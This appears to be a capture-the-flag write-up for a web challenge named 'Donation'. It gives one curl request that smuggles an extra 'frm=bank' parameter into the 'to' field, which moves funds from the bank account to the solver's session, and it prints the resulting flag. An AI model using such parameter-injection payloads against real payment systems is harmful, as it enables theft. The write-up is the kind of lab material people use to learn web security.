[../](../../)

# Donation

## web

> Save the kittens!
>
> [http://138.68.96.149:2293](http://138.68.96.149:2293)
>
> [donation.zip](donation.zip)

## Solution

After inspecting the sources, you can find the possibility to generate money from `bank`. The following request injects the `frm=bank` variable into the `to` variable and allows to transfer `amount=1000` to the session that enables you to buy the flag afterwards.

	$ curl 'http://138.68.96.149:2293/donate' -H 'Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsIm5hbWUiOiJhYmNkIn0.Xf6ATg.LRKaW2AE1SERH4DlRHxMlO99ees' --data 'amount=1000&to=abcd%26frm=bank'

flag: `flag{lo0k_at_all_the_p0llut1on}`